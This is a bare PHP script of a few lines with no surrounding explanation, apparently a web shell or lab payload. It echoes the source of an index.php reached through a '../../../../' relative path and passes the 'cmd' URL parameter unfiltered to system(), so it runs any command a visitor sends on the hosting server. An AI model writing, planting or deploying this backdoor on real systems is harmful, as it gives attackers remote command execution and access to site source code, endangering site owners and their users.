<?php
    echo htmlspecialchars(file_get_contents('../../../../index.php'));
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>